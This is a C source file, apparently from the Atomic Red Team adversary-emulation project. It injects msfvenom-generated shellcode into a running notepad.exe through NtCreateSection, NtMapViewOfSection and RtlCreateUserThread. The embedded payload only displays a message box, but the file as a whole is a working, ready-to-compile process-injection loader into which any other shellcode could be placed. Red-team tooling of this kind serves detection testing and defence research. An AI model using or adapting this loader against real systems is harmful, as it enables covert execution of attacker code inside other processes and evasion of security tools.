/*
    Injector for Atomic Red Team leveraging code injection using NtCreateSection, NtMapViewOfSection and RtlCreateUserThread.
    Author: traceflow@0x8d.cc
*/

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>


// msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Atomic Red Team" -f csharp
unsigned char shellcode[] = {0xfc,0x48,0x81,0xe4,0xf0,0xff,
0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,
0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,
0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,
0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,
0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,
0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,
0x40,0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,
0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,
0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,
0x00,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x0e,0x01,0x00,0x00,0x48,
0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,
0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x41,0x74,0x6f,
0x6d,0x69,0x63,0x20,0x52,0x65,0x64,0x20,0x54,0x65,0x61,0x6d,
0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00
};

unsigned int shellcode_len = sizeof(shellcode);

// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
typedef NTSTATUS (NTAPI * NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL); 

// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits OPTIONAL,
	IN OUT PULONG StackReserved OPTIONAL,
	IN OUT PULONG StackCommit OPTIONAL,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle OPTIONAL,
	OUT PCLIENT_ID ClientId OPTIONAL);


int FindProcess(const char *procname) {

        HANDLE hSnapshot;
        PROCESSENTRY32 pe32;
        DWORD pid = 0;
                
        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hSnapshot, &pe32)) {
                CloseHandle(hSnapshot);
                return 0;
        }
                
        while (Process32Next(hSnapshot, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
        CloseHandle(hSnapshot); 
        return pid;
}

HANDLE FindThread(int pid) {
    HANDLE hThread = NULL;
    THREADENTRY32 thEntry;

    thEntry.dwSize = sizeof(thEntry);
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    while(Thread32Next(hThreadSnap, &thEntry)) {
        if(thEntry.th32OwnerProcessID == pid) {
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
            break;
        }
    }
    CloseHandle(hThreadSnap);

    return hThread;
}

int Inject(HANDLE hProc, unsigned char *shellcode, unsigned int shellcode_len)
{
    HANDLE hSection = NULL;
    PVOID pLocalSectionView = NULL;
    PVOID pRemoteSectionView = NULL;
    HANDLE hThread = NULL;

    // Get pointers to the functions we need from ntdll.dll
    NtCreateSection_t NtCreateSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
    if(NtCreateSection == NULL) return -1;
    NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
    if(NtMapViewOfSection == NULL) return -1;
    RtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
    if(RtlCreateUserThread == NULL) return -1;

    // Create section object in the process.
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &shellcode_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // Create local section view.
    NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalSectionView, NULL, NULL, NULL, (SIZE_T *) &shellcode_len, ViewUnmap, NULL, PAGE_READWRITE);

    // Copy payload in section.
    memcpy(pLocalSectionView, shellcode, shellcode_len);

    // Create remote section view in the target process.
    NtMapViewOfSection(hSection, hProc, &pRemoteSectionView, NULL, NULL, NULL, (SIZE_T *) &shellcode_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

    // Make the target process execute the shellcode.
    RtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteSectionView, 0, &hThread, NULL);
    if(hThread != NULL) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }

    return -1;

    
}


int main(int argc, char *argv[]) {
    DWORD pid = 0;
    HANDLE hProc = NULL;

    pid = FindProcess("notepad.exe");

    if(pid) {
        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);

        if(hProc != NULL) {
            Inject(hProc, shellcode, shellcode_len);
            CloseHandle(hProc);
        } else {
            printf("Error opening process.\n");
        }
    } else {
        printf("Notepad.exe not running. Run Notepad first.\n");
    }
    return 0;

}
